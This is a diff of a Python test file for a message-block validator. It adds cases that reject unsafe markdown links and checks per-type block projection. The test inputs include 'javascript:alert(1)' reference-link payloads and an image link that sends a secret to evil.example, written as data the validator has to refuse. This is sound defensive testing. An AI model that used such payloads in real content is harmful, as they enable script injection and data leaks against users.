@@ -37,6 +37,8 @@ def test_markdown_and_suggestions_join_the_typed_block_union():
     "![x](https://evil.example/p?d=secret)",
     "> [1]: javascript:alert(1)",
     "- [1]: javascript:alert(1)",
+    "[x][r]\n\n1) [r]: javascript:alert(1)",
+    "[x][a\\]b]\n\n[a\\]b]: javascript:alert(1)",
 ])
 def test_markdown_rejects_html_unsafe_links_and_oversize(content):
     with pytest.raises(ValidationError):
@@ -48,7 +50,7 @@ def test_markdown_accepts_http_inline_and_reference_links():
     assert isinstance(_BLOCK.validate_python(markdown("xem [x][1]\n\n[1]: https://ihrd.vn")), MarkdownBlock)
 
 
-@pytest.mark.parametrize("labels", [(), ("a", "b", "c", "d", "e"), ("x" * 61,)])
+@pytest.mark.parametrize("labels", [(), ("a", "b", "c", "d", "e"), ("x" * 61,), ("a", "a")])
 def test_suggestions_are_bounded(labels):
     with pytest.raises(ValidationError):
         _BLOCK.validate_python(suggestions(*labels))
@@ -72,6 +74,14 @@ FULL = CapabilitySnapshot(supported_blocks=[
 def test_supported_blocks_pass_through_unchanged():
     blocks = (_BLOCK.validate_python(markdown("**A**")), _BLOCK.validate_python(suggestions("Hi")))
     assert project_blocks(blocks, FULL) == blocks
+
+
+def test_projection_is_per_block_type():
+    markdown_only = CapabilitySnapshot(supported_blocks=[
+        {"type": "text", "schema_versions": [1]}, {"type": "markdown", "schema_versions": [1]}])
+    md, sg = project_blocks((_BLOCK.validate_python(markdown("**A**")), _BLOCK.validate_python(suggestions("Hi"))),
+                            markdown_only)
+    assert (md.type, sg.type) == ("markdown", "text")
 
 
 def test_legacy_clients_receive_text_with_stable_ids():
